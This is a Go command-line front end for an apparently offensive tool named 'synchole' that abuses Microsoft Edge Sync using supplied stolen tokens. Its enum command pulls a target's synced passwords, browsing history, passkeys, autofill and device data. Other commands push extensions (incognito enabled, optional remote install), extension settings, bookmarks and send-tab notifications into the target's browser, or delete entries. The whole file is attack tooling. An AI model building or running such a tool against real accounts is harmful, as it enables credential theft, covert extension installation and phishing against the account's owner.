package main

import (
	"fmt"
	"os"
	"strconv"

	"synchole/sync"

	"github.com/spf13/cobra"
)

var rootCmd = &cobra.Command{
	Use:   "synchole",
	Short: "Edge Sync standalone tool",
	Long:  "Standalone Edge Sync enumeration and write tool. Requires access tokens to be provided directly.",
}

var syncTypeFlags = []struct {
	Flag string
	Desc string
	Code int32
}{
	{"session", "Open tabs / sessions (SessionSpecifics)", sync.SYNC_TYPE_SESSION},
	{"autofill", "Autofill form fields (AutofillSpecifics)", sync.SYNC_TYPE_AUTOFILL},
	{"autofillprofile", "Saved address/profile (AutofillProfile)", sync.SYNC_TYPE_AUTOFILL_PROFILE},
	{"webauthn", "WebAuthn credentials / passkeys", sync.SYNC_TYPE_WEBAUTHN_CREDENTIAL},
	{"webapp", "Installed web apps (WebApp)", sync.SYNC_TYPE_WEB_APP},
	{"sendtab", "Send-tab-to-self entries", sync.SYNC_TYPE_SEND_TAB_TO_SELF},
	{"savedtabgroup", "Saved tab groups", sync.SYNC_TYPE_SAVED_TAB_GROUP},
	{"userconsent", "User consent records", sync.SYNC_TYPE_USER_CONSENT},
	{"historydelete", "History delete directives", sync.SYNC_TYPE_HISTORY_DELETE_DIRECTIVE},
	{"nigori", "Crypto/keybag state (Nigori)", sync.SYNC_TYPE_NIGORI},
	{"edrop", "Edge E-Drop payloads", sync.SYNC_TYPE_EDGE_E_DROP},
	{"deviceinfo", "Synced device info (alias of --device)", sync.SYNC_TYPE_DEVICE},
}

var enumCmd = &cobra.Command{
	Use:     "enum",
	Aliases: []string{"e"},
	Short:   "Enumerate sync data",
	Long:    "Enumerate sync data types from a target's Edge sync",
	Run: func(cmd *cobra.Command, args []string) {
		newkey, _ := cmd.Flags().GetString("newkey")
		aadrmstoken, _ := cmd.Flags().GetString("aadrmstoken")
		msedgetoken, _ := cmd.Flags().GetString("msedgetoken")

		debug, _ := cmd.Flags().GetBool("debug")
		device, _ := cmd.Flags().GetBool("device")
		preference, _ := cmd.Flags().GetBool("preference")
		password, _ := cmd.Flags().GetBool("password")
		extension, _ := cmd.Flags().GetBool("extension")
		useful, _ := cmd.Flags().GetBool("useful")
		history, _ := cmd.Flags().GetBool("history")
		code, _ := cmd.Flags().GetInt("code")

		edgesynccodes := []int32{}
		if device {
			edgesynccodes = append(edgesynccodes, sync.SYNC_TYPE_DEVICE)
		}
		if preference {
			edgesynccodes = append(edgesynccodes, sync.SYNC_TYPE_PREFERENCE)
		}
		if password {
			edgesynccodes = append(edgesynccodes, sync.SYNC_TYPE_PASSWORDS)
		}
		if extension {
			edgesynccodes = append(edgesynccodes, sync.SYNC_TYPE_EXTENSIONS)
			edgesynccodes = append(edgesynccodes, sync.SYNC_TYPE_EXTENSION_SETTINGS)
		}
		if useful {
			edgesynccodes = append(edgesynccodes, sync.SYNC_TYPE_PASSWORDS)
			edgesynccodes = append(edgesynccodes, sync.SYNC_TYPE_DEVICE)
			edgesynccodes = append(edgesynccodes, sync.SYNC_TYPE_HISTORY)
		}
		if history {
			edgesynccodes = append(edgesynccodes, sync.SYNC_TYPE_HISTORY)
		}
		if code != 0 {
			edgesynccodes = append(edgesynccodes, int32(code))
		}
		all, _ := cmd.Flags().GetBool("all")
		for _, tf := range syncTypeFlags {
			on, _ := cmd.Flags().GetBool(tf.Flag)
			if on || all {
				edgesynccodes = append(edgesynccodes, tf.Code)
			}
		}
		if ev, _ := cmd.Flags().GetBool("everything"); ev {
			edgesynccodes = append(edgesynccodes, sync.AllDataTypeCodes()...)
		}
		seen := map[int32]bool{}
		deduped := edgesynccodes[:0]
		for _, c := range edgesynccodes {
			if !seen[c] {
				seen[c] = true
				deduped = append(deduped, c)
			}
		}
		edgesynccodes = deduped
		sync.Debug = debug
		sync.Silent, _ = cmd.Flags().GetBool("silent")
		syncclient := sync.SyncClient{
			Deriviationkey: newkey,
			AADRmsToken:    aadrmstoken,
			MsEdgeToken:    msedgetoken,
			EnumSyncCodes:  edgesynccodes,
		}
		if len(edgesynccodes) == 0 {
			fmt.Println("[-] A Sync Code Must Be Specified")
			return
		}
		syncclient.Create()

		everything, _ := cmd.Flags().GetBool("everything")
		if everything || len(edgesynccodes) > 8 {
			sync.RandomSyncRequestPerType(syncclient.MsEdgeToken, syncclient.Decryptionkey, edgesynccodes)
		} else {
			syncclient.Enum()
		}
	},
}

func initEnumFlags() {
	enumCmd.PersistentFlags().StringP("newkey", "k", "", "Use an already identified deriviation key")
	enumCmd.PersistentFlags().StringP("aadrmstoken", "r", "", "AAD RMS Token (required if newkey isn't specified)")
	enumCmd.PersistentFlags().StringP("msedgetoken", "s", "", "MSEdge Sync Token")
	enumCmd.PersistentFlags().BoolP("device", "d", false, "Enumerate device info")
	enumCmd.PersistentFlags().BoolP("preference", "", false, "Enumerate preferences")
	enumCmd.PersistentFlags().BoolP("password", "p", false, "Enumerate passwords")
	enumCmd.PersistentFlags().BoolP("useful", "u", false, "Enumerate passwords, device, history")
	enumCmd.PersistentFlags().BoolP("history", "H", false, "Enumerate only browsing history")
	enumCmd.PersistentFlags().BoolP("extension", "e", false, "Enumerate extensions and settings")
	enumCmd.PersistentFlags().BoolP("debug", "", false, "Specify for debug output")
	enumCmd.PersistentFlags().BoolP("silent", "", false, "Suppress raw secret material output")
	enumCmd.PersistentFlags().IntP("code", "c", 0, "Specify a sync code")
	enumCmd.PersistentFlags().Bool("all", false, "Enumerate every data type that has a typed parser")
	enumCmd.PersistentFlags().Bool("everything", false, "Request EVERY known data type (full registry)")
	for _, tf := range syncTypeFlags {
		enumCmd.PersistentFlags().Bool(tf.Flag, false, tf.Desc)
	}
}

var extensionCmd = &cobra.Command{
	Use:   "extension",
	Short: "Write a single extension sync entry",
	Long:  "Push one extension entry to the target's edge. Writes only the extension record; use 'settings' to push extension settings.",
	Run: func(cmd *cobra.Command, args []string) {
		newkey, _ := cmd.Flags().GetString("newkey")
		keyname, _ := cmd.Flags().GetString("keyname")
		aadrmstoken, _ := cmd.Flags().GetString("aadrmstoken")
		msedgetoken, _ := cmd.Flags().GetString("msedgetoken")
		debug, _ := cmd.Flags().GetBool("debug")

		extensionid, _ := cmd.Flags().GetString("extensionid")
		extensionversion, _ := cmd.Flags().GetString("extensionversion")
		updateurl, _ := cmd.Flags().GetString("updateurl")
		incognito, _ := cmd.Flags().GetBool("incognito")
		remoteinstall, _ := cmd.Flags().GetBool("remoteinstall")
		objid, _ := cmd.Flags().GetString("objid")
		version, _ := cmd.Flags().GetInt("version")
		deleted, _ := cmd.Flags().GetBool("delete")

		if extensionid == "" {
			fmt.Println("[-] Extension ID Required")
			return
		}

		sync.Debug = debug
		sync.Silent, _ = cmd.Flags().GetBool("silent")
		syncclient := sync.SyncClient{
			Deriviationkey: newkey,
			AADRmsToken:    aadrmstoken,
			MsEdgeToken:    msedgetoken,
		}
		syncclient.Create()

		kn, envdef, err := sync.GetWriteContext(syncclient.MsEdgeToken, keyname)
		if err != nil {
			fmt.Println("[-] Could not resolve write context: " + err.Error())
			return
		}
		keyname = kn

		_, err = sync.AddExtensionSyncRequest(syncclient.MsEdgeToken, syncclient.Decryptionkey, syncclient.Mackey, keyname, extensionid, extensionversion, updateurl, incognito, remoteinstall, objid, deleted, version, envdef)
		if err != nil {
			fmt.Println(err)
			return
		}
		fmt.Println("[+] Extension Pushed: " + extensionid)
	},
}

func initExtensionFlags() {
	extensionCmd.PersistentFlags().StringP("newkey", "k", "", "Use an already identified deriviation key")
	extensionCmd.PersistentFlags().StringP("keyname", "n", "", "The name of the encryption key (the base64 blob)")
	extensionCmd.PersistentFlags().StringP("aadrmstoken", "r", "", "AAD RMS Token (if newkey not specified)")
	extensionCmd.PersistentFlags().StringP("msedgetoken", "s", "", "MSEdge Sync Token")
	extensionCmd.PersistentFlags().StringP("extensionid", "e", "", "The extension ID to push")
	extensionCmd.PersistentFlags().StringP("extensionversion", "v", "1.0", "The extension version (e.g. 1 or 1.0)")
	extensionCmd.PersistentFlags().StringP("updateurl", "u", sync.DefaultExtensionUpdateURL, "The extension update_url (defaults to the Edge web store CRX endpoint)")
	extensionCmd.PersistentFlags().Bool("incognito", true, "Set IncognitoEnabled on the extension entry")
	extensionCmd.PersistentFlags().Bool("remoteinstall", false, "Set RemoteInstall on the extension entry")
	extensionCmd.PersistentFlags().StringP("objid", "", "", "The object ID (blank to create a new entry)")
	extensionCmd.PersistentFlags().Int("version", 0, "The entry version number (auto-populated for new entries)")
	extensionCmd.PersistentFlags().Bool("delete", false, "Tombstone (delete) the extension entry")
	extensionCmd.PersistentFlags().Bool("debug", false, "Debug output")
	extensionCmd.PersistentFlags().BoolP("silent", "", false, "Suppress raw secret material output")
}

var settingsCmd = &cobra.Command{
	Use:   "settings",
	Short: "Write a single extension-settings sync entry",
	Long:  "Push one extension setting (a name/value pair) to the target's edge.",
	Run: func(cmd *cobra.Command, args []string) {
		newkey, _ := cmd.Flags().GetString("newkey")
		keyname, _ := cmd.Flags().GetString("keyname")
		aadrmstoken, _ := cmd.Flags().GetString("aadrmstoken")
		msedgetoken, _ := cmd.Flags().GetString("msedgetoken")
		debug, _ := cmd.Flags().GetBool("debug")

		extensionid, _ := cmd.Flags().GetString("extensionid")
		name, _ := cmd.Flags().GetString("name")
		value, _ := cmd.Flags().GetString("value")

		if keyname == "" {
			fmt.Println("[-] Key Name Required")
			return
		}
		if extensionid == "" {
			fmt.Println("[-] Extension ID Required")
			return
		}
		if name == "" {
			fmt.Println("[-] Setting name (--name) Required")
			return
		}

		sync.Debug = debug
		sync.Silent, _ = cmd.Flags().GetBool("silent")
		syncclient := sync.SyncClient{
			Deriviationkey: newkey,
			AADRmsToken:    aadrmstoken,
			MsEdgeToken:    msedgetoken,
		}
		syncclient.Create()

		_, err := sync.AddExtensionSettingsSyncRequest(syncclient.MsEdgeToken, syncclient.Decryptionkey, syncclient.Mackey, keyname, extensionid, name, value)
		if err != nil {
			fmt.Println(err)
			return
		}
		fmt.Println("[+] Extension Setting Pushed: " + name + "=" + value)
	},
}

func initSettingsFlags() {
	settingsCmd.PersistentFlags().StringP("newkey", "k", "", "Use an already identified deriviation key")
	settingsCmd.PersistentFlags().StringP("keyname", "n", "", "The name of the encryption key (the base64 blob)")
	settingsCmd.PersistentFlags().StringP("aadrmstoken", "r", "", "AAD RMS Token (if newkey not specified)")
	settingsCmd.PersistentFlags().StringP("msedgetoken", "s", "", "MSEdge Sync Token")
	settingsCmd.PersistentFlags().StringP("extensionid", "e", "", "The extension ID the setting belongs to")
	settingsCmd.PersistentFlags().String("name", "", "The setting name")
	settingsCmd.PersistentFlags().StringP("value", "", "", "The setting value")
	settingsCmd.PersistentFlags().Bool("debug", false, "Debug output")
	settingsCmd.PersistentFlags().BoolP("silent", "", false, "Suppress raw secret material output")
}

var deleteCmd = &cobra.Command{
	Use:     "delete",
	Aliases: []string{"del"},
	Short:   "Delete a sync item",
	Long:    "Delete a sync item with client tag hash, id and version",
	Run: func(cmd *cobra.Command, args []string) {
		newkey, _ := cmd.Flags().GetString("newkey")
		aadrmstoken, _ := cmd.Flags().GetString("aadrmstoken")
		msedgetoken, _ := cmd.Flags().GetString("msedgetoken")

		debug, _ := cmd.Flags().GetBool("debug")
		cth, _ := cmd.Flags().GetString("clienttaghash")
		objid, _ := cmd.Flags().GetString("id")
		version, _ := cmd.Flags().GetString("version")

		sync.Debug = debug
		sync.Silent, _ = cmd.Flags().GetBool("silent")
		syncclient := sync.SyncClient{
			Deriviationkey: newkey,
			AADRmsToken:    aadrmstoken,
			MsEdgeToken:    msedgetoken,
		}
		syncclient.Create()

		if version == "" {
			fmt.Println("[-] Version required")
		}
		if cth == "" {
			fmt.Println("[-] Client Tag Hash required")
		}
		if objid == "" {
			fmt.Println("[-] Entry ID required")
		}

		verint, err := strconv.Atoi(version)
		if err != nil {
			fmt.Println(err)
			return
		}
		_, err = sync.DeleteSyncRequest(syncclient.MsEdgeToken, cth, verint, objid)
		if err != nil {
			fmt.Println(err)
			return
		}
		fmt.Println("[+] Successfully Deleted Entry")
	},
}

func initDeleteFlags() {
	deleteCmd.PersistentFlags().StringP("newkey", "k", "", "Use an already identified deriviation key")
	deleteCmd.PersistentFlags().StringP("aadrmstoken", "r", "", "AAD RMS Token (if newkey not specified)")
	deleteCmd.PersistentFlags().StringP("msedgetoken", "s", "", "MSEdge Sync Token")
	deleteCmd.PersistentFlags().StringP("clienttaghash", "c", "", "The client tag hash of the item to delete")
	deleteCmd.PersistentFlags().StringP("version", "v", "", "The version number of the item to delete")
	deleteCmd.PersistentFlags().StringP("id", "", "", "The ID of the item to delete")
	deleteCmd.PersistentFlags().Bool("debug", false, "Debug output")
	deleteCmd.PersistentFlags().BoolP("silent", "", false, "Suppress raw secret material output")
}

var bookmarkCmd = &cobra.Command{
	Use:   "bookmark",
	Short: "Create or update a bookmark in the target's sync",
	Long:  "Write a bookmark entry. Omit --guid to create a new bookmark; pass an existing bookmark's --guid (with a higher --version) to update it in place.",
	Run: func(cmd *cobra.Command, args []string) {
		newkey, _ := cmd.Flags().GetString("newkey")
		aadrmstoken, _ := cmd.Flags().GetString("aadrmstoken")
		msedgetoken, _ := cmd.Flags().GetString("msedgetoken")
		keyname, _ := cmd.Flags().GetString("keyname")
		name, _ := cmd.Flags().GetString("name")
		url, _ := cmd.Flags().GetString("url")
		guid, _ := cmd.Flags().GetString("guid")
		parent, _ := cmd.Flags().GetString("parent")
		version, _ := cmd.Flags().GetInt64("version")
		del, _ := cmd.Flags().GetBool("delete")
		debug, _ := cmd.Flags().GetBool("debug")

		if name == "" || url == "" {
			fmt.Println("[-] --name and --url are required")
			return
		}
		sync.Debug = debug
		sync.Silent, _ = cmd.Flags().GetBool("silent")
		syncclient := sync.SyncClient{Deriviationkey: newkey, AADRmsToken: aadrmstoken, MsEdgeToken: msedgetoken}
		syncclient.Create()
		kn, envdef, err := sync.GetWriteContext(syncclient.MsEdgeToken, keyname)
		if err != nil {
			fmt.Println("[-] Could not resolve write context: " + err.Error())
			return
		}
		if guid != "" && version == 0 {
			if v, ok, _ := sync.GetEntryVersion(syncclient.MsEdgeToken, sync.SYNC_TYPE_BOOKMARKS, sync.ClientTagHashFor(sync.SYNC_TYPE_BOOKMARKS, guid)); ok {
				version = v
				fmt.Printf("[*] Updating existing bookmark (base version %d)\n", version)
			}
		}
		if err := sync.AddBookmarkSyncRequest(syncclient.MsEdgeToken, kn, envdef, syncclient.Decryptionkey, syncclient.Mackey, name, url, guid, parent, version, del); err != nil {
			fmt.Println(err)
		}
	},
}

func initBookmarkFlags() {
	bookmarkCmd.PersistentFlags().StringP("newkey", "k", "", "Use an already identified deriviation key")
	bookmarkCmd.PersistentFlags().StringP("aadrmstoken", "r", "", "AAD RMS Token (if newkey not specified)")
	bookmarkCmd.PersistentFlags().StringP("msedgetoken", "s", "", "MSEdge Sync Token")
	bookmarkCmd.PersistentFlags().String("keyname", "", "Encryption key name (auto-fetched from Nigori if omitted)")
	bookmarkCmd.PersistentFlags().StringP("name", "n", "", "Bookmark title")
	bookmarkCmd.PersistentFlags().StringP("url", "u", "", "Bookmark URL")
	bookmarkCmd.PersistentFlags().StringP("guid", "g", "", "Bookmark GUID — omit to create, supply existing to update")
	bookmarkCmd.PersistentFlags().StringP("parent", "p", "", "Parent folder GUID (default: Bookmark Bar)")
	bookmarkCmd.PersistentFlags().Int64P("version", "v", 0, "Entry version (bump above current to update)")
	bookmarkCmd.PersistentFlags().Bool("delete", false, "Tombstone (delete) the entry")
	bookmarkCmd.PersistentFlags().Bool("debug", false, "Debug output")
	bookmarkCmd.PersistentFlags().BoolP("silent", "", false, "Suppress raw secret material output")
}

var sendtabCmd = &cobra.Command{
	Use:   "sendtab",
	Short: "Push a Send-Tab-To-Self entry to a target device",
	Long:  "Write a Send-Tab-To-Self entry. --target-guid is the receiving device's sync cache guid (from DeviceInfo); --from-device is the sender name shown in the notification.",
	Run: func(cmd *cobra.Command, args []string) {
		newkey, _ := cmd.Flags().GetString("newkey")
		aadrmstoken, _ := cmd.Flags().GetString("aadrmstoken")
		msedgetoken, _ := cmd.Flags().GetString("msedgetoken")
		keyname, _ := cmd.Flags().GetString("keyname")
		title, _ := cmd.Flags().GetString("title")
		url, _ := cmd.Flags().GetString("url")
		fromDevice, _ := cmd.Flags().GetString("from-device")
		fromGuid, _ := cmd.Flags().GetString("from-guid")
		targetGuid, _ := cmd.Flags().GetString("target-guid")
		guid, _ := cmd.Flags().GetString("guid")
		version, _ := cmd.Flags().GetInt64("version")
		del, _ := cmd.Flags().GetBool("delete")
		debug, _ := cmd.Flags().GetBool("debug")

		if title == "" || url == "" || targetGuid == "" {
			fmt.Println("[-] --title, --url and --target-guid are required")
			return
		}
		sync.Debug = debug
		sync.Silent, _ = cmd.Flags().GetBool("silent")
		syncclient := sync.SyncClient{Deriviationkey: newkey, AADRmsToken: aadrmstoken, MsEdgeToken: msedgetoken}
		syncclient.Create()
		kn, envdef, err := sync.GetWriteContext(syncclient.MsEdgeToken, keyname)
		if err != nil {
			fmt.Println("[-] Could not resolve write context: " + err.Error())
			return
		}
		if guid != "" && version == 0 {
			if v, ok, _ := sync.GetEntryVersion(syncclient.MsEdgeToken, sync.SYNC_TYPE_SEND_TAB_TO_SELF, sync.ClientTagHashFor(sync.SYNC_TYPE_SEND_TAB_TO_SELF, guid)); ok {
				version = v
				fmt.Printf("[*] Updating existing send-tab (base version %d)\n", version)
			}
		}
		if err := sync.AddSendTabSyncRequest(syncclient.MsEdgeToken, kn, envdef, syncclient.Decryptionkey, syncclient.Mackey, title, url, fromDevice, fromGuid, targetGuid, guid, version, del); err != nil {
			fmt.Println(err)
		}
	},
}

func initSendtabFlags() {
	sendtabCmd.PersistentFlags().StringP("newkey", "k", "", "Use an already identified deriviation key")
	sendtabCmd.PersistentFlags().StringP("aadrmstoken", "r", "", "AAD RMS Token (if newkey not specified)")
	sendtabCmd.PersistentFlags().StringP("msedgetoken", "s", "", "MSEdge Sync Token")
	sendtabCmd.PersistentFlags().String("keyname", "", "Encryption key name (auto-fetched from Nigori if omitted)")
	sendtabCmd.PersistentFlags().StringP("title", "t", "", "Tab title (shown in the notification)")
	sendtabCmd.PersistentFlags().StringP("url", "u", "", "Tab URL to open")
	sendtabCmd.PersistentFlags().StringP("from-device", "f", "", "Sender device name (specifics field 4, device_name)")
	sendtabCmd.PersistentFlags().String("target-guid", "", "Recipient device cache_guid = target_device_sync_cache_guid (from DeviceInfo, field 7)")
	sendtabCmd.PersistentFlags().String("from-guid", "", "Sender device cache_guid (entry originator; a real device)")
	sendtabCmd.PersistentFlags().StringP("guid", "g", "", "Entry GUID — omit to create, supply existing to update")
	sendtabCmd.PersistentFlags().Int64P("version", "v", 0, "Entry version (bump above current to update)")
	sendtabCmd.PersistentFlags().Bool("delete", false, "Tombstone (delete) the entry")
	sendtabCmd.PersistentFlags().Bool("debug", false, "Debug output")
	sendtabCmd.PersistentFlags().BoolP("silent", "", false, "Suppress raw secret material output")
}

func init() {
	initEnumFlags()
	initExtensionFlags()
	initSettingsFlags()
	initDeleteFlags()
	initBookmarkFlags()
	initSendtabFlags()

	rootCmd.AddCommand(enumCmd)
	rootCmd.AddCommand(extensionCmd)
	rootCmd.AddCommand(settingsCmd)
	rootCmd.AddCommand(deleteCmd)
	rootCmd.AddCommand(bookmarkCmd)
	rootCmd.AddCommand(sendtabCmd)
}

func main() {
	if err := rootCmd.Execute(); err != nil {
		os.Exit(1)
	}
}
